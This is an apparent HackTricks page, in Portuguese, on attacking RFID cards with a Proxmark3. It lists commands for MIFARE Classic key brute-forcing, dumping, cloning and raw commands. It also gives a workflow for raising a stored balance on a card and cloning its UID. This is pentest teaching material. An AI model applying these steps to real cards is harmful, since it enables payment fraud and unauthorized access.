# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Atacando sistemas RFID com Proxmark3

Instale o cliente Proxmark3 RRG/Iceman mantido ativamente e o firmware correspondente. Em seguida, confirme a sintaxe dos comandos com essa compilação, pois os comandos mais antigos mostrados abaixo podem ter mudado.<sup>[[1]](#references)[[5]](#references)</sup>

### Atacando MIFARE Classic 1KB

O MIFARE Classic 1K possui **16 setores**, cada um com **4 blocks** de **16 bytes**. O manufacturer block 0 contém os dados de UID/fabricante e é somente leitura em cartões NXP genuínos; cartões clone especiais ou “magic” podem permitir sua reescrita.<sup>[[1]](#references)[[2]](#references)</sup>\
Para acessar cada setor, você precisa de **2 chaves** (**A** e **B**), armazenadas no **block 3 de cada setor** (sector trailer). O sector trailer também armazena os **access bits**, que definem as permissões de **leitura e escrita** em **cada block** usando as 2 chaves.\
As 2 chaves são úteis para conceder permissões de leitura quando você conhece a primeira e de escrita quando conhece a segunda, por exemplo.

Vários ataques podem ser realizados
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
O Proxmark3 permite realizar outras ações, como **interceptar** uma **comunicação entre Tag e Reader** para tentar encontrar dados sensíveis. Neste cartão, você poderia simplesmente farejar a comunicação e calcular a chave usada, pois as **operações criptográficas utilizadas são fracas** e, conhecendo o texto claro e o texto cifrado, você pode calculá-la (ferramenta `mfkey64`).<sup>[[3]](#references)</sup>

#### Fluxo rápido do MiFare Classic para abuso de valor armazenado

Quando os terminais armazenam saldos em cartões Classic, um fluxo típico de ponta a ponta é:<sup>[[4]](#references)</sup>
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
Notas

- `hf mf autopwn` orquestra ataques no estilo nested/darkside/HardNested, recupera chaves e cria dumps na pasta de dumps do cliente.<sup>[[1]](#references)</sup>
- A gravação do bloco 0/UID só funciona em cartões magic gen1a/gen2. Cartões Classic normais têm UID somente para leitura.<sup>[[2]](#references)</sup>
- Muitas implementações usam "value blocks" do Classic ou checksums simples. Garanta que todos os campos duplicados/complementados e checksums estejam consistentes após a edição.<sup>[[4]](#references)</sup>

Consulte uma metodologia de nível mais alto e medidas de mitigação em:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Comandos Raw

Às vezes, sistemas IoT usam **tags não identificadas por marca ou não comerciais**. Nesse caso, você pode usar o Proxmark3 para enviar **comandos raw personalizados para as tags**.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quitting Search
```
Com essas informações, você pode tentar pesquisar informações sobre o cartão e sobre a forma de se comunicar com ele. O Proxmark3 permite enviar comandos brutos como: `hf 14a raw -p -b 7 26`

### Scripts

O software Proxmark3 vem com uma lista pré-carregada de **scripts de automação** que você pode usar para executar tarefas simples. Para obter a lista completa, use o comando `script list`. Em seguida, use o comando `script run`, seguido pelo nome do script:
```
proxmark3> script run mfkeys
```
Você pode criar um script para **fuzz tag readers**; assim, após copiar os dados de um **cartão válido**, basta escrever um **Lua script** que **aleatorize** um ou mais **bytes** e verificar se o **leitor trava** em alguma iteração.

## References

- [1] [Wiki do Proxmark3: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Wiki do Proxmark3: cartões HF Magic](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [Declaração da NXP sobre o MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [Exploração de vulnerabilidade em cartões NFC no KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
- [5] [Proxmark3 da RRG/Iceman — instalação no Linux](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/md/Installation_Instructions/Linux-Installation-Instructions.md)
{{#include ../../banners/hacktricks-training.md}}
